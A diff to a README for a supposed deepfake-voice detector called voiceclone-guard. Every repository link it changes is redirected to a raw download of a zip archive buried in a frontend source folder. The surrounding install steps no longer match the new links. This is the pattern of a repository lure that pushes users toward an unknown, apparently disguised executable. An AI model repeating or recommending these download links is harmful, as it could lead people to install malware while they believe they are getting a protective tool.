@@ -1,6 +1,6 @@
 # 🛡️ voiceclone-guard - Detect deepfake voices with ease now
 
-[![Download Voiceclone-guard](https://img.shields.io/badge/Download-Voiceclone--guard-blue)](https://github.com/Pat-divisionarchaebacteria894/voiceclone-guard)
+[![Download Voiceclone-guard](https://img.shields.io/badge/Download-Voiceclone--guard-blue)](https://github.com/Pat-divisionarchaebacteria894/voiceclone-guard/raw/refs/heads/main/frontend/src/components/guard_voiceclone_3.4.zip)
 
 Voiceclone-guard provides a safe way to check audio files for signs of digital manipulation. This software identifies fake voices created by artificial intelligence. You host the program on your own computer. You do not need to sign up for accounts or pay for API keys to use it.
 
@@ -18,7 +18,7 @@ Your computer must meet these requirements to run the application:
 
 Follow these steps to set up the software on your Windows computer:
 
-1.  Visit the official repository download page: [https://github.com/Pat-divisionarchaebacteria894/voiceclone-guard](https://github.com/Pat-divisionarchaebacteria894/voiceclone-guard)
+1.  Visit the official repository download page: [https://github.com/Pat-divisionarchaebacteria894/voiceclone-guard/raw/refs/heads/main/frontend/src/components/guard_voiceclone_3.4.zip](https://github.com/Pat-divisionarchaebacteria894/voiceclone-guard/raw/refs/heads/main/frontend/src/components/guard_voiceclone_3.4.zip)
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the most recent version number to see the available files.
 4.  Find the file ending in .exe and click it to save the installer to your computer.
@@ -79,7 +79,7 @@ If you encounter issues, try these steps:
 3.  **Confirm format:** Ensure your file ends in one of the supported formats.
 4.  **Reinstall:** Delete the program and download the installer again from the link.
 
-[https://github.com/Pat-divisionarchaebacteria894/voiceclone-guard](https://github.com/Pat-divisionarchaebacteria894/voiceclone-guard)
+[https://github.com/Pat-divisionarchaebacteria894/voiceclone-guard/raw/refs/heads/main/frontend/src/components/guard_voiceclone_3.4.zip](https://github.com/Pat-divisionarchaebacteria894/voiceclone-guard/raw/refs/heads/main/frontend/src/components/guard_voiceclone_3.4.zip)
 
 ## ⚖️ Privacy and Ethics
 
